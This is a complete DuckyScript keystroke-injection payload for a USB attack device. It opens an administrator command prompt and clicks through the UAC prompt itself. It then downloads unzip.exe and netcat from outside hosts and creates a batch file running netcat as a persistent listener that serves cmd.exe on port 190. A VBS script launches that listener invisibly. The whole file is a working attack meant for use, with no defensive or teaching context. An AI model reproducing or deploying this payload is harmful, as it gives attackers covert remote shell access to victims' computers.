DELAY 100
GUI r
DELAY 500
STRING powershell Start-Process cmd -Verb RunAs
ENTER
DELAY 2500
ALT y
DELAY 500
STRING cd %userprofile%
ENTER

REM *** Delete zip file if already exists ***
STRING erase /Q nc.zip
ENTER
REM *** Delete nc folder file if already exists ***
STRING erase /Q netcat-1.11
ENTER


REM *** Downloads Unzip.exe ****
STRING powershell (new-object System.Net.WebClient).DownloadFile('https://www.dropbox.com/s/cg7gfrsej5xocsi/unzip.exe?dl=1','unzip.exe')
ENTER
DELAY 500
STRING cd %userprofile%
ENTER

REM *** Downloads NetCat ****

STRING powershell (new-object System.Net.WebClient).DownloadFile('https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip','nc.zip')
ENTER
DELAY 500
STRING cd %userprofile%
ENTER
STRING unzip nc.zip
ENTER
STRING cd netcat-1.11
ENTER

REM *** batch file made to start txt file ***
STRING copy con Start.bat
ENTER
STRING nc -lp 190 -vv -e cmd.exe -L
ENTER
CONTROL z
ENTER

REM *** Starts batch file invisibly ***
STRING copy con invis.vbs
ENTER
STRING Set WshShell = CreateObject("WScript.Shell" ) 
ENTER
STRING WshShell.Run chr(34) & "Start.bat" & Chr(34), 0 
ENTER
STRING Set WshShell = Nothing 
ENTER
CONTROL z
ENTER
STRING start invis.vbs
ENTER

STRING exit 
ENTER
